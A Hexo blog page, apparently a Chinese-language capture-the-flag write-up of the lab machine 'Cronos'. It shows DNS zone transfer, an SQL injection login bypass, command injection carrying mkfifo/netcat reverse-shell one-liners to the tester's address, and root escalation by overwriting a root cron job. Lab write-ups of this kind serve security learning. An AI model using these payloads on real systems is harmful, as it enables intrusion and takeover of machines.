@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>cronos | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port explore 22 53:DNS服务的端口 80:80端口是apache2正常工作的默认界面 #### 目录遍历  目录遍历没扫出什么来，所以53端口可能存在可以利用的漏洞 可以先用host命令列出该域名下的所有主机名 &#96;host -l cronos.htb 10.10.10.13&#96;  结果存在三个不同的网址，将其加入&#x2F;etc&#x2F;hosts文件 访问www.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cronos">
+<meta property="og:url" content="http://example.com/2022/09/06/cronos/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port explore 22 53:DNS服务的端口 80:80端口是apache2正常工作的默认界面 #### 目录遍历  目录遍历没扫出什么来，所以53端口可能存在可以利用的漏洞 可以先用host命令列出该域名下的所有主机名 &#96;host -l cronos.htb 10.10.10.13&#96;  结果存在三个不同的网址，将其加入&#x2F;etc&#x2F;hosts文件 访问www.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/dir.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/domain.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/admin.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/ifconfig.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/nc.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/srpn.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/rev.png">
+<meta property="og:image" content="http://example.com/2022/09/06/cronos/root.png">
+<meta property="article:published_time" content="2022-09-07T01:06:42.000Z">
+<meta property="article:modified_time" content="2022-09-07T02:25:52.754Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/06/cronos/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-cronos" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/06/cronos/" class="article-date">
+  <time class="dt-published" datetime="2022-09-07T01:06:42.000Z" itemprop="datePublished">2022-09-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      cronos
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/06/cronos/nmap.png">
+#### port explore
+22
+53:DNS服务的端口
+80:80端口是apache2正常工作的默认界面
+#### 目录遍历
+<img src="/2022/09/06/cronos/dir.png">
+目录遍历没扫出什么来，所以53端口可能存在可以利用的漏洞
+可以先用host命令列出该域名下的所有主机名
+`host -l cronos.htb 10.10.10.13`
+<img src="/2022/09/06/cronos/domain.png">
+结果存在三个不同的网址，将其加入/etc/hosts文件
+访问www.cronos.htb,会定向到一个网站，由Laravel搭建
+admin.cronos.htb是一个登陆界面
+在admin.cronos.htb页面尝试使用万能密码进行登录`admin' or 1=1#`,成功实现登录
+<img src="/2022/09/06/cronos/admin.png">
+感觉可以实现堆叠查询
+<img src="/2022/09/06/cronos/ifconfig.png">
+<img src="/2022/09/06/cronos/nc.png">
+用nc反弹一个shell到本机
+(`rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0/tmp/p`)
+`8.8.8.8 | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.5 8888 >/tmp/f`
+(`rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.41+1234+>/tmp/f`)
+用python改进交互式终端
+`python -c 'import pty;pty.spawn("/bin/sh")'`
+成功得到user权限
+#### root
+<img src="/2022/09/06/cronos/srpn.png">
+可以看到/var/www/laravel/artisan这个文件会以root权限每分钟运行一次
+那我们可以尝试用一个反弹shell的php文件覆盖它，让它执行
+<img src="/2022/09/06/cronos/rev.png">
+上传到目标机并覆盖原文件
+成功获得root权限
+<img src="/2022/09/06/cronos/root.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/06/cronos/" data-id="cl7r02fye0000zfcpdehqfi47" data-title="cronos" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/06/haircut/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          haircut
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/06/bastard/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">bastard</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
